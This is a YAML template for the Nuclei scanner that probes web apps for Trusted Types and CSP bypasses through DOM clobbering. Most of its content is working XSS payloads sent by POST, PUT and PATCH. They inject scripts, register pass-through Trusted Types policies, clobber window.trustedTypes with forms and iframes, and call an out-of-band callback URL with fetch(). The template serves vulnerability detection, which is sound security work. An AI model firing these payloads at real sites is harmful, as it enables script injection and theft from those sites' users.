http:
- headers:
    Accept: text/html,application/xhtml+xml
    Sec-Fetch-Site: same-origin
  matchers:
  - case-insensitive: true
    condition: or
    part: header
    type: word
    words:
    - trusted-types
    - require-trusted-types-for
  - case-insensitive: true
    condition: or
    part: body
    type: word
    words:
    - trustedTypes
    - createPolicy
    - TrustedHTML
    - TrustedScript
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/'
  - '{{BaseURL}}/app'
  - '{{BaseURL}}/secure'
  - '{{BaseURL}}/admin'
- body: "{\n  \"html_content\": \"{{clobbering_payload}}<script>setTimeout(()=>{if(window.trustedTypes&&window.trustedTypes.createPolicy){var\
    \ p=trustedTypes.createPolicy('bypass',{createHTML:x=>x,createScript:x=>x,createScriptURL:x=>x});document.body.innerHTML=p.createHTML('<img\
    \ src=x onerror=fetch(\\\"{{callback_url}}/bypass-{{bypass_id}}\\\")>')}}, 100)</script>\"\
    ,\n  \"trusted_types_enabled\": true,\n  \"bypass_csp\": true\n}\n"
  headers:
    Content-Type: application/json
  matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  method: POST
  path:
  - '{{BaseURL}}/api/content'
  - '{{BaseURL}}/render'
  - '{{BaseURL}}/html'
  - '{{BaseURL}}/template'
- body: "{\n  \"policy_name\": \"default\",\n  \"policy_config\": {\n    \"createHTML\"\
    : \"return arguments[0]\",\n    \"createScript\": \"return arguments[0]\",\n \
    \   \"createScriptURL\": \"return arguments[0]\"\n  },\n  \"clobbering_test\"\
    : \"{{policy_bypass}}\",\n  \"validation_callback\": \"{{callback_url}}/policy-{{bypass_id}}\"\
    \n}\n"
  headers:
    Content-Type: application/json
  matchers:
  - case-insensitive: true
    condition: or
    part: body
    type: word
    words:
    - policy created
    - trusted types configured
    - bypass successful
  - condition: and
    part: interactsh_protocol
    type: word
    words:
    - http
  matchers-condition: or
  method: PUT
  path:
  - '{{BaseURL}}/api/policy'
  - '{{BaseURL}}/trusted/config'
- body: "{\n  \"csp_directive\": \"trusted-types 'unsafe-inline' *\",\n  \"require_trusted_types\"\
    : false,\n  \"dom_injection_test\": \"<form id='window'><input name='trustedTypes'></form><iframe\
    \ name='trustedTypes' src='javascript:parent.window.trustedTypes={createPolicy:()=>({createHTML:x=>x+\\\
    \"<img src=x onerror=fetch(\\\\\\\"{{callback_url}}/clobbered-{{bypass_id}}\\\\\
    \\\")\\\"})}; void 0'></iframe>\",\n  \"bypass_verification\": true\n}\n"
  headers:
    Content-Type: application/json
  matchers:
  - condition: and
    part: interactsh_protocol
    type: word
    words:
    - http
  method: PATCH
  path:
  - '{{BaseURL}}/api/csp/update'
  - '{{BaseURL}}/security/headers'
- body: content={{clobbering_payload}}<script>try{if(trustedTypes.createPolicy){var
    malicious=trustedTypes.createPolicy('evil',{createHTML:x=>x+'<img src=x onerror=fetch("{{callback_url}}/tt-bypass-{{bypass_id}}")'});document.body.innerHTML=malicious.createHTML('PWNED')}}catch(e){fetch('{{callback_url}}/error-{{bypass_id}}',
    {method:'POST', body:JSON.stringify({error:e.message})})}</script>&bypass_trusted_types=true
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  method: POST
  path:
  - '{{BaseURL}}/api/dom/test'
  - '{{BaseURL}}/xss/filter'
- body: "{\n  \"template\": \"<div>{{user_content}}</div>\",\n  \"user_content\":\
    \ \"<object data='data:text/html,<form id=trustedTypes><input name=createPolicy></form><script>top.trustedTypes.createPolicy=(n,p)=>({createHTML:h=>h+`<img\
    \ src=x onerror=fetch(\\\"{{callback_url}}/object-{{bypass_id}}\\\">`});void 0</script>'></object>\"\
    ,\n  \"enable_trusted_types\": true,\n  \"sanitize_content\": false,\n  \"callback_url\"\
    : \"{{callback_url}}/template-{{bypass_id}}\"\n}\n"
  extractors:
  - group: 1
    part: body
    regex:
    - TrustedHTML\s*:\s*([^\n]+)
    type: regex
  - json:
    - .policy_violations
    - .trusted_types_bypassed
    - .csp_report
    type: json
  headers:
    Content-Type: application/json
  matchers:
  - condition: and
    part: interactsh_protocol
    type: word
    words:
    - http
  method: POST
  path:
  - '{{BaseURL}}/api/template/render'
  - '{{BaseURL}}/compile'
id: trusted-types-dom-clobbering-bypass
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N
    cvss-score: 7.4
    cwe-id: CWE-79,CWE-1021,CWE-91
  description: 'Detects Trusted Types policy bypass vulnerabilities through DOM clobbering
    attacks.

    Tests for policy pollution, trusted type sink bypass, and CSP circumvention via

    strategic DOM element placement. This attack vector is virtually unexplored as

    Trusted Types are bleeding-edge browser security features.

    '
  name: Trusted Types DOM Clobbering Bypass Detection
  reference:
  - https://web.dev/trusted-types/
  - https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
  - https://w3c.github.io/trusted-types/dist/spec/
  - https://research.securitum.com/dom-clobbering-strikes-back/
  severity: high
  tags: trusted-types,dom-clobbering,csp-bypass,xss,policy-bypass
variables:
  bypass_id: '{{randstr}}'
  callback_url: '{{interactsh-url}}'
  clobbering_payload: <form id='trustedTypes'><input name='createPolicy' value='malicious'></form><img
    name='trustedTypes' id='createPolicy'>
  policy_bypass: <div id='trustedTypes'><span id='createPolicy'></span></div><iframe
    name='trustedTypes' srcdoc='<script>parent.trustedTypes={}; parent.trustedTypes.createPolicy=()=>({createHTML:x=>x,
    createScript:x=>x, createScriptURL:x=>x})</script>'></iframe>
